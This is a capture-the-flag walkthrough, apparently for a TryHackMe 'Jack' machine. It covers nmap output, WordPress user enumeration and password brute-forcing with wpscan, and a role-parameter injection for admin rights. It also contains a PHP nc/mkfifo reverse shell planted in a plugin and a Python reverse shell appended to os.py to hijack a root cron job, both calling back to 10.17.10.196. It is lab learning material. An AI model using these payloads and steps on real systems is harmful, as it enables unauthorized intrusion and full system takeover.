# Jack

## NMAP

```
Nmap scan report for 10.10.201.61
Host is up (0.16s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3e:79:78:08:93:31:d0:83:7f:e2:bc:b6:14:bf:5d:9b (RSA)
|   256 3a:67:9f:af:7e:66:fa:e3:f8:c7:54:49:63:38:a2:93 (ECDSA)
|_  256 8c:ef:55:b0:23:73:2c:14:09:45:22:ac:84:cb:40:d2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 5.3.2
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jack&#039;s Personal Site &#8211; Blog for Jacks writing adven...
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/11%OT=22%CT=1%CU=40110%PV=Y%DS=5%DC=T%G=Y%TM=61139F9
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   33.61 ms  10.17.0.1
2   ... 4                                                                                                                                                                                     
5   153.50 ms 10.10.201.61                                                                                                                                                                    
                                                                                                                                                                                              
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                         
Nmap done: 1 IP address (1 host up) scanned in 517.10 seconds    
```

## Finding usernames /wp-admin/

`wpscan -e u,ap --url http://jack.thm`

Save the usernames found in users.txt

## Find Password

`wpscan -U users.txt -P /usr/share/wordlists/fasttrack.txt --url jack.thm`

We got password of wendy cracked.

lets login to http://jack.thm/wp-admin/

## Getting reverse shell

1. We can exploit either using metasploit https://www.exploit-db.com/exploits/44595.
Or we can exploit manually with burpsuite and escalate privilege to administrator.
2. Go to profile.
3. Intecept the traffic using burpsuite. Click on update.
4. In burpsuite, add `&ure_other_roles=administrator` before `&action..` at the end and forward the traffic.
5. Now we are administrator.
6. Go to plugin > plugin editor.
7. Add `<?php rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.10.196 1234 >/tmp/f ?> at the beginning pf the file.
8. save the file.
9. Start nc listner.
10. Activate the edited plugin and we have reverse shell.

## Privilege Escalation to Jack

In `/var/backup` we have a file `rsa_id` we can use it to ssh as jack.

## Privilege Escalation to root

1. Use pspy64 to find cronjob and we  found checker.py.
2. While investigating checker.py uses os module. 
3. Jack is in a group family. When using `find / -group family -ls 2>/dev/null` jack have write access to all python2.7 files.
4. Add the below code to the end of `os.py` file:
```
import socket
import pty
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.17.10.196",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
```
5. Start a nc listener and wait for a while.
6. Now we are root.

***

